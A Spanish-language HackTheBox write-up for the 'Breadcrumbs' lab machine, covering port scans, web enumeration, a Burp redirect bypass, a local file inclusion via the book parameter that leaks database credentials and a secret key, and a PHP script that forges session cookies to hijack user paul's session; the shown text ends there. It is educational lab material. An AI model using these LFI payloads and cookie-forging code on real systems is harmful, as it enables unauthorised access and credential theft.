---
layout      : post
title       : "HackTheBox - Breadcrumbs"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png
category    : [ htb ]
tags        : [ SQLi, LFI, cookie-hijacking, file-upload, port-forwarding, AES, JWT ]
---
Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un **LFI**, haremos **cookie-hijacking**, leeremos contraseñas almacenadas, jugando con binarios encontramos una **URL** que nos llevara de la mano a un **SQLi** y haremos desencriptación con claves **AES**.

![316breadcrumbsHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316breadcrumbsHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [helich0pper](https://www.hackthebox.eu/profile/163104).

¿Todo perfe? 

> **Se viene un laaargo writeup, pero es bastante practico y con cositas interesantes...**

Máquina muuuuuy divertida, empezaremos encontrando un servicio web que nos permite (entre varias cosas) listar libros de una base de datos y subir archivos, pero solo si tenemos permisos de administrador. En vez de encontrar una vulnerabilidad **SQL** en el listado de libros encontraremos un ***LFI*** que nos permitirá ver archivos del sistema, usaremos esto para entender como tener permisos de administrador y subir el archivo. 

Validando nos daremos cuenta de que es necesario tener la sesión del usuario **paul** dentro del portal web; con esto en mente visitaremos el archivo que genera las cookies (`cookie.php`) para entenderlo y ver si podemos simular la sesión de **paul**. Y sí, vemos como se generan y despues de algo de jugueteo logramos obtener la cookie del usuario `paul`, la usaremos para obtener acceso como él en el sitio web.

Despues de unos movimientos con **tokens** lograremos subir archivos al sitio, por medio de **Burp** podemos cambiar el contenido e incluso el nombre del archivo a subir, con esto lograremos subir un archivo `.php` para obtener ejecucion remota de comandos, generaremos una Reverse Shell para finalmente obtener una sesión como el usuario **www-data** (:

> [**RCE** mediante el archivo **.php** (me gusto resto el script)](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/RCE_uploadPHPfile.py).

Enumerando encontraremos unas credenciales para un servicio de pizza a domicilio :P el cual tiene info de **juliette**, que validando, es un usuario del sistema y con esas credenciales logramos su sesión por medio de `SSH`.

En las "notas" de **juliette** encontraremos 3 tareas a realizar, pero que 1 nos llamara la atención, habla sobre el software **Microsoft Sticky Notes** y que es necesario migrar las contraseñas, ya que las guarda en texto plano", con esto en mente lograremos (con ayuda de Google) encontrar la ruta donde se guardan estos archivos y efectivamente, encontraremos las credenciales de **juliette**, pero a la vez las del usuario **development**, las usaremos para migrarnos a su sesión.

Encontraremos un binario algo inquietante que juega con llaves **AES**, revisando su contenido (`type <file>`) veremos que es tipo **ELF** y que tiene hardcodeada una **URL** con la que hace el juego de las llaves... La URL corre en el puerto **1234**, si jugamos con `cURL` e intentamos "explotarla" vemos respuesta por parte de `mysql`, nos apoyaremos de un **Remote Port Forwarding** para llevarnos el puerto **1234** a nuestra máquina y probar cositas, nos enfrentaremos a una inyección **SQL blind** que usaremos para extraer la password del usuario **administrador**. 

> [**SQLi**, fases para obtener la info de la base de datos](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi).

Finalmente usaremos la columna `aes-key` (inicialmente nos la muestra como resultado de una ejecucion normal hacia la URL, pero también podemos extraerla con el **SQLi**) para desencriptar la password. Usando la contraseña desencriptada lograremos una sesión en la máquina como el usuario **administrator**.

Mucho textoooooooooooo, a darle.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/> 

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

¿Que vamos a hacer?

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento Lateral Juliette](#movimiento-lateral-juliette).
4. [Movimiento Lateral Development](#movimiento-lateral-dev).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Inicialmente haremos un escaneo de puertos para saber que servicios están activos en la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.228 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535.                                                                                  |
| --open     | Solo los puertos que están abiertos.                                                                      |
| -v         | Permite ver en consola lo que va encontrando.                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard. |

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.228
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.228 ()   Status: Up
Host: 10.10.10.228 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, open/tcp//mysql///, 5040/open/tcp//unknown///, 7680/open/tcp//pando-pub///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp////, 49669/open/tcp/////
# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 74.39 seconds
```

Oko, tenemos varios puertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Acceso a un servidor remoto por medio de un canal seguro.     |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)**: Servidor web.                    |
| 135    | **[RPC](https://en.wikipedia.org/wiki/Port_135)**: Permite ejecutar procesos remotamente.                            |
| 139    | **[SMB](https://www.varonis.com/blog/smb-port/)**: Permite compartir información entre dispositivos de la misma red. |
| 443    | **[HTTPS](https://introbay.com/blog/https-que-es-y-para-que-sirve)**: Servidor web "seguro".                         |
| 445    | **[SMB](https://www.varonis.com/blog/smb-port/)**: Permite compartir información entre dispositivos de la misma red. |
| 3306   | **[MYSQL](https://es.wikipedia.org/wiki/MySQL)**: Gestor de bases de datos.                                          |
| 7680   | **[pando-pub](https://en.wikipedia.org/wiki/Pando_(application))**: Aplicación para enviar archivos muy pesados.     |
| 5040/49664/49665 | No sabemos |
| 49666/49667/49668/49669 | No sabemos |

Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto) encontrado, asi validamos a profundidad cada uno:

```bash
❭ nmap -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sC -sV 10.10.10.228 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan
# Nmap 7.80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sC -sV -oN portScan 10.10.10.228
Nmap scan report for 10.10.10.228
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LANDesk-RC, NULL, SIPOptions, WMSRequest: 
|_    Host '10.10.14.194' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=3/10%Time=60494628%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"G...............................................................
...
# Mucha info vacia
...
..............................................................x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m08s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-10T22:26:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 181.68 seconds
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH for_Windows_7.7 (protocol 2.0) |
| 80     | HTTP     | Apache httpd 2.4.46                    |
| 135    | RPC      | Microsoft Windows RPC                  |
| 139    | SMB      | Microsoft Windows netbios-ssn          |
| 443    | HTTPS    | Apache httpd 2.4.46                    |
| 445    | SMB      | Ni idea u.u                            |
| 3306   | MYSQL    | MariaDB                                |
| 7680   | PANDO    | No sabe ._ .                           |
| ...    | Unknown  | Unknown                                |

Pues démosle a los servicios y veamos por donde podemos empezar a romper :O

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![316page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80.png)

Bien, simplemente obtenemos lo que parece ser un simulador de librería, si nos fijamos hay un botón que nos redirecciona a `/php/books.php`, veamos:

![316page80_php_booksPHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_php_booksPHP.png)

Jmmm, un buscador de libros intuyo, podemos buscar por título y por autor, si buscamos por cualquier letra nos filtra varios libros (claramente dependiendo de la letra :P), como por ejemplo buscando en el título la letra `a`, tenemos:

![316page80_php_booksPHP_searchTitle_a](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_php_booksPHP_searchTitle_a.png)

Enumerando el código fuente, vemos la ruta "`http://10.10.10.228/js/books.js`" que es la que procesa lo que hagamos en la web de los libros, asi mismo vemos en algunas partes del **JavaScript** el llamado de otro script: 

* `../includes/bookController.php`.

Asi que tenemos otra ruta para enumerar, `/includes`. Esto me dio la idea de hacer un escaneo rápido con **nmap** para ver que recursos no están a la vista sobre el servidor web del puerto 80:

```bash
❭ nmap -p 80 --script=http-enum 10.10.10.228 -oN webScan
```

```bash
❭ cat webScan 
# Nmap 7.80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p 80 --script=http-enum -oN webScan 10.10.10.228
Nmap scan report for 10.10.10.228
Host is up (0.12s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|_  /php/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'

# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27.39 seconds
```

Bien, algo que me llamo la atención fue la descripción de la carpeta `/db/`:

* **BlogWorx Database**. 

Que si buscamos en internet, nos muestra exploits viejos relacionados con `SQLi` sobre ese servicio, pero probando con el archivo que esta dentro de esa carpeta (`/db/db.php`) no conseguimos nada... ***Para tenerlo en cuenta.***

Si validamos el contenido del servicio `HTTPS (443)` vemos el mismo contenido que el del puerto `80`...

Haciendo un escaneo con `dirsearch` encontramos nuevos directorios:

```bash
❭ dirsearch.py -u http://10.10.10.228/ -q
...
302 -    0B  - http://10.10.10.228/portal/  ->  login.php
...
```

Validando, efectivamente tenemos un login y también la opción de registrarnos:

![316page80_portal_login](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_login.png)

En esta pantalla ya tenemos un redireccionamiento (en `helper`) a un archivo llamado `/admins.php` el cual tiene varios usuarios potenciales para tener en cuenta:

![316page80_portal_php_admins](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_php_admins.png)

Despues de registrarnos y entrar al "portal" tenemos:

> (Menu desplegable arriba a la derecha)

![316page80_portal_dashboard_menu](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_dashboard_menu.png)

![316page80_portal_dashboard](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_dashboard.png)

Contamos con **4** botones, veamos `Check tasks`:

![316page80_portal_php_issues](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_php_issues.png)

Interesante... Relaciona todos los problemas que necesitan arreglar tanto en la web como en la compañia... Lo que nos damos cuenta con el ultimo problema es que si validamos la opcion `logout` del menu desplegable claramente hay un problema con su ejecución:

![316page80_portal_auth_logout_err](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_auth_logout_err.png)

Bien, por ahora sigamos enumerando los recursos... Si vemos el botón `Order pizza` obtenemos el mensaje:

> Disabled for economical reasons

:P

Validando el botón `User management`:

![316page80_portal_php_users](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_php_users.png)

Vemos también varios usuarios, la mayoría ya los habíamos visto en el anterior recurso, pero en este encuentro tenemos sus roles y además 3 nuevos usuarios:

* `sirine` -> Reception.
* `juliette` -> Server Admin.
* `support` -> -.

De los 3 `juliette` es interesante, tengámosla presente por si algo, sigamos.

Si validamos el último botón (**File management**) nos llevaría al recurso `/files.php`, pero al dar clic tenemos un redireccionamiento a `/index.php`... Si jugamos con **BurpSuite** podemos interceptar la petición antes de que nos redireccione para ver que contenido tiene realmente, esto jugando con el código de estado, pasándolo de **302 (Found)** a **200 (Ok)**, hagámoslo rápidamente:

Primero habilitamos en las opciones del **proxy** el ítem para interceptar las respuestas:

![316burp_enable_proxy_response_intercept](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_enable_proxy_response_intercept.png)

Ahora, lanzamos la petición desde la web y la interceptamos en `Burp`:

![316burp_proxy_intercept_on](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_intercept_on.png)

Damos clic en `Forward` y obtenemos:

![316burp_proxy_intercept_forward](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_intercept_forward.png)

Ahora simplemente modificamos el **status code** de `302` a `200` y damos clic en `Forward`:

![316burp_proxy_intercept_sCode_200](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_intercept_sCode_200.png)

![316page_portal_php_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page_portal_php_files.png)

Bien, tenemos un apartado para subir archivos `.zip`, pero si intentamos subir algo obtenemos:

> Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.

Asi ees como viaja la petición:

![316burp_req_fileupload](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_req_fileupload.png)

Y este es el archivo (`/portal/assets/js/files.js`) que procesa la petición:

```js
$(document).ready(function(){
    $("#upload").click(function(){
        var formData = new FormData();
        formData.append('file', $('#file')[0].files[0]);
        formData.append('task', $('#task').val() + ".zip");
        post(formData);
        formData = null;
    })
});


function post(formData){
    jQuery.ajax({
        url: "../includes/fileController.php",
        type: "POST",
        processData: false,
        contentType: false,
        data: formData,
        success: function(res){
            $("#message").html(res);
        }
    });
}
```

No sé por qué dice "upload code" siempre, pero bueno esa es la respuesta. También entiendo que no podemos subir nada por el status que tenemos desde el inicio que dice `Role: Awaiting approval`, asi que por ahora no podremos hacer nada con esto...

Si queremos mantener la opción hecha en `Burp` sobre el status code, podemos crear una regla para que cada vez que llegue un status code de `302` nos lo cambie por `200`:

* **Proxy** > **Options** > **Match and Replace** > **Add**:

![316burp_proxy_options_addRule_sC](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_options_addRule_sC.png)

Y ya no tendríamos que estar modificando la petición en `Burp`.

...

Jugando con `Burp` caí en cuenta de algo, al iniciar sesión se nos genera una `Cookie` con el siguiente formato:

```php
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJKYXRhIjp7InVzZXJuYW1lIjoibGFueiJ9fQ.liQqzYVpD3qq_0y70ft7fHPwBFknX1Hd2Naxp7Ioubo;
PHPSESSID=lanz23ccbc5fab78e561862271461cc6bedc
```

O sea:

```php
Cookie: token=BLABLABLA; PHPSESSID=usernameBLABLABLA
```

Podemos probar varias cosas, como incrementar el tamaño de nuestro `username`, cambiar el contenido del `PHPSESSID`, agregar números o incluso caracteres especiales y ver si nos responde algo inusual...

Pues despues de probar algunas de ellas, si agregamos el símbolo `#` en la variable `PHPSESSID` nos responde:

![316burp_phpsessid_with_symbol](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_phpsessid_with_symbol.png)

Opa, vemos la ruta donde esta el servidor y además un usuario (`www-data`). 

> También para tenerlo en cuenta...

En este punto me estanqué, asi que volví atrás para ver que tenía y que no había revisado bien (y pues bien hecho).

Volviendo al apartado donde buscamos libros por su título y autor, si nos enfocamos en el código que hace todo el proceso, nos damos cuenta de algo interesante:

> Les pongo el codigo pa ver si ven el error antes de explicarlo :P

```js
http://10.10.10.228/js/books.js
```

```js
$(document).ready(function(){
    var book = null;
    $("#note").click(function(){
        $("#tableBody").html("");
        const title = $("#title").val();
        const author = $("#author").val();
        if(title == "" && author == ""){
            $("#message").html("Nothing found :(");
        }
        else{
            searchBooks(title, author);
        }
    })

    $("#interested").click(function(){

    });
});

function getInfo(e){
    const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            book: bookId,
            method: 1,
        },
        dataType: "json",
        success: function(res){
            $("#about").html(res);
        }
    });
}

function modal(){
    return '<button type="button" onclick="getInfo(this)" class="btn btn-outline-warning" data-toggle="modal" data-target="#actionModal">Book</button>';
}

function searchBooks(title, author){
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            title: title,
            author: author,
            method: 0,
        },
        dataType: "json",
        success: function(res){
            if(res.length == 0 || res == false){
                $("#message").html("Nothing found :(");
            }
            else{
                let ret = "";
                for(book in res){
                    $("#message").html("");
                    ret += "<tr id='" + res[book].id + "'>";
                    ret += "<td>"+res[book].title+"</td>";
                    ret += "<td>"+res[book].author+"</td>";
                    ret += "<td>" + modal() + "</td>";
                    ret += "</tr>";
                    $("#tableBody").html(ret)
                }
            }
        }
    });
}
```

Si validamos todo el recorrido que hace (comparándolo con el `HTML` del cual extrae los `IDs`) tendríamos resumidamente algo asi:

* Cuando se genere un clic en el botón Search (ID `note`) guarda la info de los dos campos y si alguno de los dos tiene contenido se va para la función `searchBooks()`.
* Aquí simplemente hace la búsqueda por medio de `AJAX` y si encuentra resultados los muestra, por ahora nada relevante.
* Cuando nos muestra todos los libros encontrados, en pantalla tenemos más opciones:

![316page80_php_booksPHP_searchTitle_a](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_php_booksPHP_searchTitle_a.png)

* Si volvemos al `codigo` y buscamos el llamado al botón `Book`, vemos que se genera cada uno de ellos en la respuesta anterior, esta siendo llamada por la función `modal()` y su contenido:

```js
...
function modal(){
    return '<button type="button" onclick="getInfo(this)" class="btn btn-outline-warning" data-toggle="modal" data-target="#actionModal">Book</button>';
...
```

* Cuando se da clic nos lleva a la función `getInfo()` y acá es donde esta el jugueteo:

```js
...
function getInfo(e){
    const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            book: bookId,
            method: 1,
        },
...
```

...

## Explotación [#](#explotacion) {#explotacion}

Que tenemos...

* Vemos que genera una cadena de texto extrayendo el ID que despues buscara como `bookId` en el archivo `bookController.php`. 
* Simulando la cadena tendríamos algo asi: 
  * `book2.html` (**2** o cualquier numero). 

Esto ya llama la atención porque podemos pensar que esta llamando archivos `.html` del sistema, o sea que podemos probar algún tipo de `LFI` (Local File Inclusion) o `RFI` (Remote File Inclusión). 

Interceptemos con `Burp` y juguemos...

> Local File Inclusion: Ver archivos del sistema a lso cuales normalemten no tendriamos acceso.
> Remote File Inclusion: Ver archivos remotos (externos) desde el sistema local. (Lo cual es muuuuuuuuucho más peligroso)

* [Inclusión de archivos](https://www.cyberseguridad.net/inclusion-de-ficheros-remotos-rfi-remote-file-inclusion-ataques-informaticos-ii).
* [Como funciona un **Local File Inclusion**](https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/).

La petición normal sería esta:

![316burp_searchDescBook_normal](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_searchDescBook_normal.png)

Ahora modificando el contenido podríamos probar a encontrar inicialmente el archivo `bookController.php` para ver que tan lejos estamos del directorio `/htdocs` y centrarnos...

> El propio output al poner una ruta equivocada nos indica donde estamos, **pero no me acordaba**.

Probando `../includes...` tenemos el output del archivo:

![316burp_searchDescBook_LFI_bookC](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_searchDescBook_LFI_bookC.png)

Un poco horrible el output :P, pero bueno, al menos confirmamos una inclusión local de archivos (**LFI**).

Viendo su contenido me acordé del archivo `db.php`, si vemos su contenido y lo intentamos hacer más bonito tenemos:

```php
book=../db/db.php&method=1
```

```php
<?php

$host = "localhost";
$port=3306;
$user="bread";
$password="jUli901";
$dbname="bread";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());

?>
```

Nice, tenemos las credenciales de la base de datos de lo que parece ser el usuario `juliette` (si dice "bread" pero la password dice otra cosa :P)... Intentando rehusar esas contraseñas contra el servicio `SSH` y `mysql` no logramos nada. Sigamos jugando con el `LFI`...

**(Les dejo el contenido del archivo vulnerable para que le echen un ojo al problema:**

```php
<?php

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $out = "";
    require '../db/db.php';
    $title = "";
    $author = "";
    if($_POST['method'] == 0){
        if($_POST['title'] != ""){
            $title = "%".$_POST['title']."%";
        }
        if($_POST['author'] != ""){
            $author = "%".$_POST['author']."%";
        }
        $query = "SELECT * FROM books WHERE title LIKE ? OR author LIKE ?";
        $stmt = $con->prepare($query);
        $stmt->bind_param('ss', $title, $author);
        $stmt->execute();
        $res = $stmt->get_result();
        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
    }
    elseif($_POST['method'] == 1){
        $out = file_get_contents('../books/'.$_POST['book']);
    }
    else{
        $out = false;
    }
    echo json_encode($out);
}
```

**e.e)**

Si recordamos teniamos un archivo para subir objetos `.zip`, veamos su estructura:

```php
book=../portal/php/files.php&method=1
```

```php
<?php 

session_start();
$LOGGED_IN = false;
if($_SESSION['username'] !== "paul"){
    header("Location: ../index.php");
}
if(isset($_SESSION['loggedIn'])){
    $LOGGED_IN = true;
    require '../db/db.php';
}
else{
    header("Location: ../auth/login.php");
    die();
}

?>

<html lang="en">
<head>
    <title>Binary</title>
    ...
...
```

La razón por la que no podemos entrar es porque **no es `paul` el que hace la petición** :O 

Despues de dar algunas vueltas entre archivos buscando cositas, encontré una cadena interesante que quizás nos pueda servir despues (`secret_key`):

```php
book=../portal/authController.php&method=1
```

```php
...
$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
...
```

Y encontramos como se genera la `cookie` de sesión:

```php
book=../portal/cookie.php&method=1
```

```php
<?php
/**
* @param string $username  Username requesting session cookie
* * @return string $session_cookie Returns the generated cookie
* * @devteam
* * Please DO NOT use default PHPSESSID; our security team says they are predictable.
* * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
**/

function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);
    return $session_cookie;
    
}
```

Jugando con [un ejecutador de código online](https://paiza.io/es/projects/new) de `PHP` podemos entender mejor que hace:

```php
<?php
    $username = "lanz";
    echo "Username: $username\n";
    
    //Toma el tamaño del username y le quita 1 (lanz (4)-1=3)
    $max = strlen($username) - 1;  
    echo "Max: $max\n";
    
    //Toma un numero (en este caso) entre 0 y 3 (0,1,2,3)
    $seed = rand(0, $max);   
    echo "Seed: $seed\n";
    
    //Con el numero anterior extrae un caracter del username y lo junta con dos cadenas
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";  
    echo "Key: $key\n";
    
    //Pasa el valor de la cadena a md5 e imprime el username+md5
    $session_cookie = $username.md5($key);   
    //return $session_cookie;
    echo $session_cookie;
?>
```

Y si ejecutamos:

```html
Username: lanz
Max: 3
Seed: 3
Key: s4lTy_stR1nG_z(!528./9890
lanz23ccbc5fab73e561862271461cc6bedc
```

De esto podemos concluir que al final solo se nos pueden generar 4 tipos de `cookie`, ya que lo único que varía es el carácter y como nuestro nombre es de 4 pues solo pueden ser **4** 😇

Ahora, teniendo en cuenta esto, podemos iterar sobre el usuario **lanz** y ver que `cookies` se le generan y ver si alguna coincide con la que tenemos actualmente.

Démosle:

```php
<?php
    $username = "lanz";
    echo "Username: $username\n";
    
    #Toma el tamaño del username y le quita 1 (lanz (4)-1=3)
    $max = strlen($username) - 1;  
    echo "Max: $max\n\n";
    
    #Toma un numero (en este caso) entre 0 y 3 (0,1,2,3)
    //$seed = rand(0, $max);   

    for ($seed = 0; $seed < 4; $seed++) {
        echo "Seed: $seed\n";
        echo "Letra: $username[$seed]\n";
    
        #Con el numero anterior extrae un caracter del user name y lo junta con dos cadenas
        $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";  
        echo "Key: $key\n";
    
        #Pasa el valor de la cadena a md5 e imprime el username+md5
        $session_cookie = $username.md5($key);   
        //return $session_cookie;
        echo $session_cookie."\n\n";
    }
?>
```

Y su resultado:

```html
Username: lanz
Max: 3

Seed: 0
Letra: l
Key: s4lTy_stR1nG_l(!528./9890
lanz47200b180ccd6835d25d034eeb6e6390

Seed: 1
Letra: a
Key: s4lTy_stR1nG_a(!528./9890
lanz61ff9d4aaefe6bdf45681678ba89ff9d

Seed: 2
Letra: n
Key: s4lTy_stR1nG_n(!528./9890
lanze640846cb7f7acdbe36b4f006d12fb3e

Seed: 3
Letra: z
Key: s4lTy_stR1nG_z(!528./9890
lanz23ccbc5fab73e561862271461cc6bedc
```

**(Y si, una de las `cookies` que se genera, es la que tenemos actualmente en nuestra sesión)**

Ahora, hagamos lo mismo pero con `paul`:

> [https://paiza.io/projects/5iqJvM3BOwOFtZb0clK0Og](https://paiza.io/projects/5iqJvM3BOwOFtZb0clK0Og).

```php
<?php
    $username = "paul";
...
```

```html
Username: paul
Max: 3

Seed: 0
Letra: p
Key: s4lTy_stR1nG_p(!528./9890
paula2a6a014d3bee04d7df8d5837d62e8c5

Seed: 1
Letra: a
Key: s4lTy_stR1nG_a(!528./9890
paul61ff9d4aaefe6bdf45681678ba89ff9d

Seed: 2
Letra: u
Key: s4lTy_stR1nG_u(!528./9890
paul8c8808867b53c49777fe5559164708c3

Seed: 3
Letra: l
Key: s4lTy_stR1nG_l(!528./9890
paul47200b180ccd6835d25d034eeb6e6390
```

Si probamos con un editor de cookie, logramos robarle la sesión a **paul** con la última generada:

```html
Seed: 3
Letra: l
Key: s4lTy_stR1nG_l(!528./9890
paul47200b180ccd6835d25d034eeb6e6390
```

![316page80_editCookie_paul_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_editCookie_paul_done.png)

